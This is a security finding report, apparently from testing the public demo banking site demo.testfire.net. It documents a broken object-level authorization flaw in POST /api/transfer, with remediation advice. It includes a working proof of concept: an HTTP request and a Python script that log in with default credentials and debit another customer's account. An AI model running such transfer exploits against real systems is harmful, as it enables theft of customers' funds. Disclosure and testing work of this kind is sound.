# Broken Object-Level Authorization in POST /api/transfer enables transferring funds out of arbitrary accounts

**ID:** vuln-0008
**Severity:** MEDIUM
**Found:** 2026-09-20 21:48:12 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /api/transfer
**Method:** POST
**CWE:** CWE-639
**CVSS:** 6.5
**Confidence:** High
**Fix Effort:** Low

## Description

The REST endpoint `POST /api/transfer` moves funds out of the account named in `fromAccount` without verifying that the account belongs to the authenticated caller. Any authenticated user can supply another customer's account number as the source and debit it into an account they control. The equivalent web endpoint (`POST /bank/doTransfer`) enforces the ownership check, so only the REST API is affected.

## Evidence

jsmith's API token (obtained from `POST /api/login`) used to debit a foreign account:

```http
POST /api/transfer HTTP/1.1
Host: demo.testfire.net
Authorization: Bearer <jsmith token>
Content-Type: application/json

{"toAccount":"800011","fromAccount":"800001","transferAmount":"1"}
```

```http
HTTP/1.1 200 OK
{"success":"1.0 was successfully transferred from Account 800001 into Account 800011 at 9/20/26 4:46 PM."}
```

Balances around the request (read via `GET /api/account/{no}` with the same token):

```text
800001 (NOT owned by jsmith): $1002626437453.38 -> $1002626437452.38   (delta -1.00)
800011 (owned by jsmith)    : -$0.01            -> $0.99               (delta +1.00)
```

Ownership context:

```text
GET /api/account -> Accounts include 800002..800023 and card 4539082039396288; "owns 800001?" -> False
```

Same operation against the web endpoint is blocked, confirming the API is the weaker path:

```text
POST /bank/doTransfer  fromAccount=800001 toAccount=800023 transferAmount=1
-> ERROR: Originating account is invalid   (800001 balance unchanged)
```

## Impact

An authenticated low-privilege user can transfer funds out of any other customer's account whose number they know or guess (account numbers are sequential/enumerable), crediting an account they control. This is direct unauthorized modification of another customer's financial records — theft of funds and integrity loss of the account ledger. The victim's balance is reduced and the attacker's increased, with the app returning a normal success message.

## Counterevidence

Actively checked for a control that would make this safe: (1) verified `800001` is genuinely not owned by the caller — it is absent from `GET /api/account` and the web transfer endpoint rejects it; (2) verified the debit actually landed on the foreign account row (balance moved -1.00) and not on the caller's account; (3) verified the request used only the caller's own token, ruling out token confusion; (4) the endpoint returned HTTP 200 with a success message, so no hidden validation rejected it. No ownership check, WAF, or secondary confirmation was observed on this path. The only constraint is that the attacker must hold some valid account, which is the normal authenticated-user position. This is a public demo with synthetic data, so the business/financial impact is illustrative, but the authorization invariant is genuinely violated.

## What Would Change This Severity

Confirmation that real (non-demo) customer funds or a production deployment share this code path would raise the severity to critical; if account numbers were non-enumerable and unguessable, exploitability would drop and severity would decrease.

## Technical Analysis

`POST /api/transfer` accepts a JSON body `{ "toAccount", "fromAccount", "transferAmount" }` and is protected only by authentication (a Bearer token). The handler validates that the source account exists and that the caller is authenticated, but it never checks that `fromAccount` is owned by the authenticated user. Ownership is instead enforced only on the web `TransferServlet` (`POST /bank/doTransfer`), which returns `ERROR: Originating account is invalid` when the source does not belong to the session user.

Consequently the API performs the debit/credit on whatever source account is supplied. Because account numbers are sequential, an attacker can iterate them and drain each in turn. The bug is an authorization gap on a state-changing operation (object reference is attacker-controlled and not scoped to the caller), not merely a data-exposure issue — the effect is a durable balance change on a foreign object.

## Proof of Concept

1. Authenticate to the REST API as the low-privilege user `jsmith` via `POST /api/login` and capture the returned `Authorization` token.
2. Confirm the target account is not owned by the caller: `GET /api/account` lists jsmith's accounts (`800002`–`800023` + card `4539082039396288`) and does NOT include `800001`.
3. Record the current balance of the foreign source account and of an account owned by jsmith (e.g. `800011`).
4. Send `POST /api/transfer` with header `Authorization: Bearer <token>` and body `{"toAccount":"800011","fromAccount":"800001","transferAmount":"1"}`.
5. Re-read both balances: the foreign account `800001` is debited and the attacker-controlled `800011` is credited, while the response reports success.
6. For contrast, repeat the same request against the web endpoint `POST /bank/doTransfer` with a logged-in web session; it is rejected with `ERROR: Originating account is invalid`.

```python
import requests, re

BASE = "http://demo.testfire.net"
tok = requests.post(BASE + "/api/login",
                    json={"username": "jsmith", "password": "demo1234"},
                    timeout=20).json()["Authorization"]
H = {"Authorization": "Bearer " + tok, "Content-Type": "application/json"}

def bal(acct):
    t = requests.get(BASE + "/api/account/" + acct, headers=H, timeout=20).text
    return re.search(r'"balance":"([^"]+)"', t).group(1)

# confirm 800001 is NOT owned by jsmith
owned = requests.get(BASE + "/api/account", headers=H, timeout=20).text
print("owns 800001?", "800001" in owned)          # -> False

before_victim, before_own = bal("800001"), bal("800011")
r = requests.post(BASE + "/api/transfer", headers=H,
                  json={"toAccount": "800011", "fromAccount": "800001",
                        "transferAmount": "1"}, timeout=20)
print(r.status_code, r.text)                       # -> 200 {"success":"1.0 was successfully transferred ..."}
print("victim 800001:", before_victim, "->", bal("800001"))   # decreased by 1
print("own    800011:", before_own,   "->", bal("800011"))    # increased by 1
```

## Remediation

Enforce server-side object-level authorization on the transfer operation: before applying a transfer, verify that `fromAccount` (and any account the caller is debiting) is one of the accounts belonging to the authenticated principal, and reject the request with an authorization error otherwise. Apply this in a single shared authorization layer used by both the REST API and the web servlet so the two transports cannot diverge. Do not rely on the client-supplied account list or on UI restrictions; re-derive the caller's authorized accounts from the authenticated identity on every transfer request. Treat a failed ownership check as an authorization failure (403), not a validation error.

## Assumptions

Assumes an attacker holds any valid authenticated account (confirmed available: jsmith/demo1234, documented default credentials). Assumes target account numbers are knowable — they are sequential and enumerable, and account objects are separately exposed by an IDOR in `/api/account/{no}`. No victim interaction is required.
